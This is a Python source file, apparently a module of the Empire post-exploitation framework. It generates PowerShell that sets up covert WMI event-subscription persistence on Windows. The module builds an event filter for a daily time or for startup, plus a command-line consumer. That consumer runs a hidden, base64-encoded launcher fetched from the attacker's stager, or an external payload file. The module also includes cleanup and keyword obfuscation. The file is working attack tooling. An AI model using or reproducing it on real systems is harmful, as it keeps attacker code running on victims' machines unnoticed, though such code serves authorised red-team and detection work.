from __future__ import print_function

import os

from builtins import str
from builtins import object

from empire.server.utils import data_util
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False

        launcher_prefix = params['Launcher']
        
        # trigger options
        daily_time = params['DailyTime']
        at_startup = params['AtStartup']
        sub_name = params['SubName']

        # management options
        ext_file = params['ExtFile']
        cleanup = params['Cleanup']
        web_file = params['WebFile']
        s_bypasses = params['Bypasses']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        status_msg = ""
        location_string = ""

        if cleanup.lower() == 'true':
            # commands to remove the WMI filter and subscription
            script = "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='"+sub_name+"'\"| Remove-WmiObject;"
            script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='"+sub_name+"'\" | Remove-WmiObject;"
            script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '"+sub_name+"'} | Remove-WmiObject;"
            script += "'WMI persistence removed.'"
            
            return script

        if ext_file != '':
            # read in an external file as the payload and build a 
            #   base64 encoded version as encScript
            if os.path.exists(ext_file):
                f = open(ext_file, 'r')
                fileData = f.read()
                f.close()

                # unicode-base64 encode the script for -enc launching
                enc_script = helpers.enc_powershell(fileData)
                status_msg += "using external file " + ext_file

            else:
                print(helpers.color("[!] File does not exist: " + ext_file))
                return ""

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher_fetcher(language='powershell', encode=True, webFile=web_file, launcher=launcher_prefix)
            
            enc_script = launcher.split(" ")[-1]
            status_msg += "using launcher_fetcher"

        # sanity check to make sure we haven't exceeded the powershell -enc 8190 char max
        if len(enc_script) > 8190:
            print(helpers.color("[!] Warning: -enc command exceeds the maximum of 8190 characters."))
            return ""

        # built the command that will be triggered
        trigger_cmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + enc_script
        
        if daily_time != '':
            
            parts = daily_time.split(":")
            
            if len(parts) < 2:
                print(helpers.color("[!] Please use HH:mm format for DailyTime"))
                return ""

            hour = parts[0]
            minutes = parts[1]

            # create the WMI event filter for a system time
            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+sub_name+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = "+hour+" AND TargetInstance.Minute= "+minutes+" GROUP WITHIN 60\"};"
            status_msg += " WMI subscription daily trigger at " + daily_time + "."

        else:
            # create the WMI event filter for OnStartup
            script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+sub_name+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
            status_msg += " with OnStartup WMI subsubscription trigger."


        # add in the event consumer to launch the encrypted script contents
        script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='"+sub_name+"';CommandLineTemplate=\""+trigger_cmd+"\";RunInteractively='false'};"

        # bind the filter and event consumer together
        script += "Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"


        script += "'WMI persistence established "+status_msg+"'"
        script = data_util.keyword_obfuscation(script)
        return script
